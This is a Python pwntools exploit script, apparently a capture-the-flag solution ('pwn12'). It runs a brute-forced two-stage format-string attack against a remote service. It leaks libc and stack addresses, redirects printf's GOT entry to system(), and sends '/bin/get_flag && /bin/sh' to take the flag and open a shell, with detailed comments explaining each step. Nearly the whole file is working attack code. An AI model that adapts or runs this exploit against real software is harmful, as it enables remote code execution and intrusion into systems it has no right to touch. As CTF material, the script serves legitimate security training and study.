#!/usr/bin/python3

#import libraries
import sys
import pwn
#get some pwn stuff into global namespace
from pwn import p64
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
pwn.context.log_level = 'error'

#assign host and port to connect to
host = "hacky2"
port = 13712
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


spawn_interactive_shell = False


def exploit():

    run_cnt = 0

    #This is the offset within libc 2.31 that main returns to
    libc_retaddr_main_offset = 146698
    #This is the offset within libc 2.31 at which the system() function lives
    libc_system_offset = 0x45e50

    #Our goal with the first format string is basically the same as in pwn11:
    #  We make use of a stack address pointing to another stack address to perform a partial 
    #    override on the address being pointed to, in the hopes that it will point to the 
    #    address of another function's return address on the stack.
    #  We know that any return address will be located on the stack at an address ending in 8,
    #    since any address is 8 bytes long (so 0 and 8 are the only option), and by convention 
    #    the stack pointer will always point to an address ending in 0. (This is also important 
    #    to consider later on, as system() makes assumptions based on this fact and will only 
    #    work if the stack is properly alligned.
    #  We also found two memory locations located at a fixed offset (ASLR-independent) relative to 
    #    our buffer on the stack, that will each always contain another stack address, that is 
    #    close enough to the return address of main so that it is sufficient to override the lower 
    #    two bytes of the address to have a chance of hitting the return address of main (or other 
    #    functions).
    #  By overriding the two bytes with any constant ending in 0x8, we have to bruteforce 12 bit, 
    #    which would give us a 1 in 4096 chance of succeeding. This chance is increased by the 
    #    factor 3, since besides the return address of main, there are two other locations within 
    #    the stackframe of printf (and below) containing return addresses. This means that on 
    #    average we should succeed every one in 1365.33 attempts.
    #
    #  Overriding the address is achieved by making printf print a set number of bytes and then 
    #    using %hn, %hhn and %lln to write values of diffentent length to the memory address 
    #    located within the referenced argument.
    #  Notably we are unable to use positional arguments (e.g. %40$hn) here, since printf will 
    #    copy the data to read to a seperate buffer before execution, if those are used. This 
    #    means we would only be able to read the state data was in when printf was invoked, not
    #    data modified by us using %n, which is necessary to override the return address.
    #  Instead we step through the arguments one-by-one using a set number of %8x until the 
    #    positions of our known memory addresses are reached. (The 8 is there to make the size 
    #    of the output fixed-size making offset-calculations easier.
    #  To print arbitrary amounts of data %[bignumber]x is used. Not that other than %x the output 
    #    size of %x cannot be set to 0, but it offers the advantage that the respective argument 
    #    being referenced does not need to contain a valid memory address to prevent segfaults.
    #    Missing data is by default padded with spaces.
    #
    #  In order to write arbitrary unsorted numbers, we can make use of overflows in combination 
    #    with limiting our output size using overflows. For example if we wanted to write 0x20 
    #    followed by 0x10, we could first output 0x10 characters, write the number using %hhn 
    #    then write another 0x110 characters bringing the total to 0x120 and again use %hhn. 
    #    Since the hh otion is limiting the output to a single byte, the overflow is disregarded 
    #    and 0x20 is written to memory. Without this wrap-around effect we would have to write the 
    #    numbers in ascending order.
    #  Anothe Trick we make use of is to use %lln when we only wanted to write two bytes  to null 
    #    the upper byes of a value in memory, and then use the same tarhet address shifted by two 
    #    to override a potential overflow.
    #
    #  Since we have two stack addreesses available to us to override, we can actually reduce 
    #    the amount of data that needs to be printed by printf to write our return address. 
    #    Although we do not know the exact value of the address we, know the relative offset 
    #    of values on the stack and can manipulaze addresses accordingly. If we override the 
    #    lower two bytes of a stack address with x and the lower two bytes of another stack 
    #    address with x+1, the second one will point to the byte located next to the first one 
    #    in memory. This way writing a three byte address (order of magnitude 2^12 = 4096 Bytes 
    #    of printf output needed) can be split in two (2^8 + 2^4) or even three (2^4 + 2^4 + 2^4) 
    #    chunks, effectively trading of the amount of memory needed (since every address needs 
    #    to be referenced by a value in memory explicitly to write it with printf) for the amount 
    #    of output data generated.
    #
    #Until now I've told you nothing new. The only changes made for pwn12 in the first format 
    #string are as follows:
    #  - The return address of main as well as a stack address with a constant offset to other 
    #      locations on the stack will be leaked using %p for use later on in the exploit.
    #  - Instead of jumping to a dedicated win() function we will jump back to main, allowing 
    #      us to once again perform a format string attack with the added knowledge of the 
    #      leaked addresses from the first format string. (Actually we do not jump back to
    #      0x401090, which is the address of main, but to 0x401091, in order to skip the 
    #      first push instruction within main and hence preserve stack allignment.
    #
    #Since PIE is still disabled, we can once again hardcode all offsets within this format 
    #  string, using %hn and %hhn leveraging the wrap-around trick mentioned above to write the  
    #  arbitrary data needed to hopefully override a return address.
    #  
    formatstr = b""
    formatstr += 6*b"%8x"
    formatstr += 32*b"%8x"
    formatstr += b"----_%p_----"
    formatstr += b"%hn"
    formatstr += 14*b"%8x"
    formatstr += b"%65402x"
    formatstr += b"----_%p_----"
    formatstr += b"%hn"
    formatstr += 10*b"%8x"
    formatstr += b"%3831x"
    formatstr += b"%lln"
    formatstr += b"%175x"
    formatstr += b"%hhn"
    formatstr += b"ENDE!\n"   # "ENDE!" is just a marker to make detecting the end of the output easier.

    #Whereas in our pwn11 exploit it did not matter which return address we hit, we now need to 
    #  keep track of this, since this determines the current position of the stack pointer and we 
    #  need to use the leaked stack address leaked earlier to deduce the location of the return 
    #  address within our new (current) stack frame.
    #Since we specifically identified three possible return addresses we might hit using the 
    #  technique described above, we record the an offset to calculate the new location of main's 
    #  return address for each of these cases in the below array, and will write to each of the 
    #  respective stack loctions, so that it doesn't matter which one we hit.
    #First offset in the array is correct, if we have hit the return addres of main, one of the 
    #  other two are correct, if we wrote something within printf's (or its callee's) stack frame.
    new_retaddr_main_leakaddr_offsets = [224, 496, 720]


    while True:
        proc=pwn.remote(host,port,fam="ipv4")

        #input()

        #receive the first prompt
        proc.readline()
        #write the formatstring described above
        proc.write(formatstr)
        try:
            run_cnt += 1
            print(f"Run #{run_cnt:{0}4d}: ", end='')

            #read the response and extract the leaked libc address (return address of main) from 
            #the beginning of outtext2 and the leaked stack address form the beginning of outtext3
            outtext1 = proc.readuntil(b"----_0x", timeout=10)
            outtext2 = proc.readuntil(b"----_0x", timeout=5)
            outtext3 = proc.readuntil(b"ENDE!", timeout=5)

            try:
                #check if we got the addresses we wanted (we might time out if stack is destroyed due 
                #to unfortunate write location) and read them is they're valid
                libc_retaddr_main_leaked = int(outtext2[0:12], 16)
                stackaddr_leaked = int(outtext3[0:12], 16)
            except ValueError:
                print("Looks like we timed out on reading our Stack leaks. Trying again...") #Maybe we destroyed something on the stack we shouldn't have.
                proc.close()
                continue

            try:
                #Now check if we get the main prompt again. If not just try again.
                nexttext = proc.readline()
                if b'Hi, what' in nexttext:

                    #We'll only end up here if we successfully jumped back to main
                    print("\nLooks like we're in for a treat: We hit a return address on the stack!")
                    print("That's the format string we used to get here:")
                    print(formatstr)

                    print("--------------------------------------------------")
                    print(f"Leaked libc address: {libc_retaddr_main_leaked:#0{0}18x}")
                    print(f"Leaked stack address: {stackaddr_leaked:#0{0}18x}")

                    #Initialize the array of potential addriesses where the new target return 
                    #address may be located using the offsets hardcoded above.
                    new_retaddr_main_stacklocations = [0] * len(new_retaddr_main_leakaddr_offsets)
                    for i in range(0,len(new_retaddr_main_leakaddr_offsets)):
                        new_retaddr_main_stacklocations[i] = stackaddr_leaked - new_retaddr_main_leakaddr_offsets[i]

                    #Use the leaked libc address to calculate the address of system()
                    #We now know where the function we want to invoke is.
                    #Now we need to find a way to invoke is with the appropriate argument ("/bin/get_flag")
                    libc_base_addr = libc_retaddr_main_leaked - libc_retaddr_main_offset
                    addr_system_fn = libc_base_addr + libc_system_offset

                    #input()

                    #0x403398 is the address of the printf got entry.
                    #Since RELRO is disabled, we will be able to override it.
                    #If we override it with the address of system(), system() will be invoked on buf.
                    #However, the write will only happen via printf, so we will also have to override 
                    #  the return address of main once again.
                    printf_got_entry = 0x403398

                    #Space reserved for our format string.
                    #Addresses will be written to buf starting at this offset.
                    addr_offset = 18*8

                    #We spit our addresses into 3 chunks of 1 byte each.
                    addr_split_no = 3
                    #This array contains all the addresses we will write to using printf.
                    addr_arr = [0] * (addr_split_no * (len(new_retaddr_main_leakaddr_offsets)+1))

                    #We initialize the array as follows:
                    #  - The first three slots are for the address of the printf got entry (shifted by 0, 1 and 2 bytes)
                    #  - Then each of the candidates for our return address follow, also each shifted by 0, 1 and 2 (9 slots total).
                    for j in range(0,addr_split_no):
                        addr_arr[j] = printf_got_entry + j
                    for i in range(0,len(new_retaddr_main_stacklocations)):
                        for j in range(0,addr_split_no):
                            addr_arr[addr_split_no + (i*addr_split_no) + j] = new_retaddr_main_stacklocations[i] + j

                    print("--------------------------------------------------")
                    print(f"system() function location: {addr_system_fn:#0{0}18x}")
                    print("return address location candidates: ", end='')
                    for i in range(0,len(new_retaddr_main_stacklocations)-1):
                        print(f"{new_retaddr_main_stacklocations[i]:#0{0}18x}, ", end='')
                    print(f"{new_retaddr_main_stacklocations[len(new_retaddr_main_stacklocations)-1]:#0{0}18x}")
                    print("--------------------------------------------------")


                    #Now we begin crafting the actual second format string.
                    formatstr = b""
                    #Note that other than before we are able to use positional arguments in this stage, since we 
                    #  have already leaked all the information we need, and hence do not need to read from 
                    #  addresses we wrote in the same printf statement. It is thus fine if the information read 
                    #  comes from a buffered copy, as the write operations will still target the memory 
                    #  addresses we inserted into the format string. This will save us a bunch of space in the 
                    #  format string (which is limited to legth 0x100 by the buffer) and thus allow us to perform 
                    #  more write operations than before.

                    #We need to keep track of the number of bytes we've written so far using printf, in order to 
                    #  calculate the number of bytes we have to write next in order to leverage the wrap-around 
                    #  effect as described above.
                    already_written = 0
                    num_to_write = 0

                    #Write the address of system() to GOT enty of printf. For this we only override the lower three 
                    #  bytes, as the upper bytes are randomized in the same manner, since bot functions are located 
                    #  within libc.
                    print("Writing partial addresses:")
                    for i in range(0,addr_split_no):
                        num_to_write = ((0x100 - (already_written & 0xFF)) & 0xFF) + ((addr_system_fn >> (i*8)) & 0xFF) 
                        already_written += num_to_write
                        formatstr += b"%" + str(num_to_write).encode() + b"x" 
                        formatstr += b"%" + str(5 + addr_offset//8 + 1 + i).encode() + b"$hhn"
                        print(f"{addr_arr[i]:#0{0}18x} <-- 0x" + (f"({(already_written >> 8):x})" if (already_written >> 8) > 0 else "") + f"{(already_written & 0xFF):{0}2x}")

                    #Now we once again weite an address in main to its return address, to once again leverage the 
                    #  input functionality and the call to printf@got.plt, which will then point to system().
                    #We do this for every potential location of the return address, to cover each case.
                    #Additionally the lowest byte is weitten first using %lln in order to null the following bytes, 
                    #  whereas the lower bytes are written using %hhn.
                    addr_main_after_push_rbp = 0x401091
                    for i in range(0,addr_split_no):
                        num_to_write = ((0x100 - (already_written & 0xFF)) & 0xFF) + ((addr_main_after_push_rbp >> (i*8)) & 0xFF)
                        already_written += num_to_write
                        formatstr += b"%" + str(num_to_write).encode() + b"x" 
                        for j in range(0,len(new_retaddr_main_stacklocations)):
                            if i == 0:
                                write_len_control = b"$lln" #Also override upper bytes with 0
                                print(f"{addr_arr[3+3*j+i]:#0{0}18x} <-- 0x" + (f"({(already_written >> 64):x})" if (already_written >> 64) > 0 else "") + f"{(already_written & 0xFFFFFFFFFFFFFFFF):{0}16x}")
                            else:
                                write_len_control = b"$hhn"
                                print(f"{addr_arr[3+3*j+i]:#0{0}18x} <-- 0x" + (f"({(already_written >> 8):x})" if (already_written >> 8) > 0 else "") + f"{(already_written & 0xFF):{0}2x}")
                            formatstr += b"%" + str(5 + addr_offset//8 + 1 + addr_split_no + i+(j*addr_split_no)).encode() + write_len_control

                    # longest possibly format string has format %000x%00$hhn%000x%00$hhn%000x%00$hhn%000x%00$hhn%000x%00$hhn%000x%00$hhn%000x%00$hhn%000x%00$hhn%000x%00$hhn%000x%00$hhn%000x%00$hhn%000x%00$hhn
                    # => set upper bound for len(formatstr) up to this point to 18*8 bytes (everything fits in there and its a multiple of 8)
                    #    This is where we place the addresses (8 byte alligned, after format string).
                    #    This is where the constant "addr_offset = 18*8" is derieved from.
                    #    In order to ensure that addresses start at this offset, we fill the formatstring with NULL bytes up to this point.
                    for i in range(0,addr_offset-len(formatstr)):
                        formatstr += b"\x00"
                    #Now attach the memory addresses where printf should write to to the format string.
                    for i in range(0,len(addr_arr)):
                        formatstr += p64(addr_arr[i])

                    #It's done.
                    print("--------------------------------------------------")
                    print("That's the format string we'll be using to obtain the flag: ")
                    print(formatstr)
                    print("--------------------------------------------------")

                    #If everything went well printf now points to system(), we loop back to main once more, 
                    #and once again receive the input prompt.
                    proc.write(formatstr + b"\n")
                    proc.readuntil(b"Pwn harder, ")
                    #Now all that is left to do is enter the command we want to execute and print the flag.
                    proc.write(b"/bin/get_flag && /bin/sh\x00")

                    try:
                        proc.readuntil(b"flag")
                        print("flag" + proc.readline().decode())
                    except Exception:
                        print("That's weird... couldn't obtain a flag. Trying again...") #Did we miss an offset or encounter a timeout when waiting for a response? I guess we'll keep trying.
                        proc.close()
                        continue

                    if spawn_interactive_shell == True:
                        proc.interactive()

                proc.close()
                break
            except EOFError:
                print("Partial Stackaddress Bruteforce failed. Trying again...") #You can only be so lucky. 
                proc.close()
                continue
        except EOFError:
            print("Looks like we're not connected anymore. Trying again...") #Maybe the input length was too much for hacky to handle?
            proc.close()
            continue


exploit()


